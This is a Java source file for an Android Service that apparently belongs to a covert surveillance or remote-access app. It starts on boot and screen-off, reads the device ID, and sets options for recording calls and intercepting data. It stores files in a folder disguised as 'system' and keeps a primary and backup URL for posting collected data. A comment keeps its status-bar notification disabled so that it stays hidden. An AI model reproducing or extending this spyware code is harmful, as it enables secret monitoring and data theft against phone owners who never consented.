package u.can.i.up.expert;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Environment;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.util.Log;

import java.io.File;

import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.threads.PreThread;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class MyService extends Service {

//    MyService(){
//        DataSet.getInstance().myService = this;
//    }

    private final IBinder myBinder = new MyLocalBinder(this);

    @Override
    public IBinder onBind(Intent intent) {
        return myBinder;
    }

    @Override
    public void onCreate() {
        DataSet.getInstance().myService = this;
        IntentFilter filterBoot = new IntentFilter(Intent.ACTION_BOOT_COMPLETED);
        filterBoot.addAction(Intent.ACTION_SCREEN_OFF);
        DataSet.getInstance().mReceiver = new ServiceReceiver();
        registerReceiver(DataSet.getInstance().mReceiver, filterBoot);
        super.onCreate();
        PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putLong("inacall", 0).commit();
    }

    @Override
    public void onStart(Intent intent, int startId) {
//		Notification note= new Notification(0, "Service Started", System.currentTimeMillis());
//		startForeground(startId, note); Create Icon in Notification Bar - Keep Commented
        super.onStart(intent, startId);
        Log.i(DataSet.getInstance().LOG_TAG + this.getClass().getName(), "Start MyService");

//    	StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
//    	StrictMode.setThreadPolicy(policy);
        DataSet.getInstance().androidId = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);

        if(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getInt("Timeout", 0)<1)
        {
            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putInt("Timeout", DataSet.getInstance().timeout).commit();
        }
        if(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("RecordCalls", false)!=false || PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("RecordCalls", false)!=true)
        {
            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("RecordCalls",DataSet.getInstance().recordCalls).commit();
        }
        if(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("intercept", false)!=false || PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("intercept", false)!=true)
        {
            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("intercept", DataSet.getInstance().intercept).commit();
        }
        if(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "")==null || PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "").equals(""))
        {
            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("AndroidID", DataSet.getInstance().androidId).commit();
        }
        if(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "")==null || PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "").equals(""))
        {
            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("File", Environment.getExternalStorageDirectory().toString() + File.separator + "system").commit();
        }
        if(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "")==null || PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "").equals(""))
        {
            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("urlPost",DataSet.getInstance().urlPostInfo).commit();
        }
        if(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("backupURL", "")==null || PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("backupURL", "").equals(""))
        {
            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("backupURL", DataSet.getInstance().backupURL).commit();
        }
        //********************************************************************************************************************************************************
        new PreThread().start();
        //********************************************************************************************************************************************************
    }
    @Override
    public void onDestroy()
    {
        unregisterReceiver(DataSet.getInstance().mReceiver);
        super.onDestroy();
    }
}
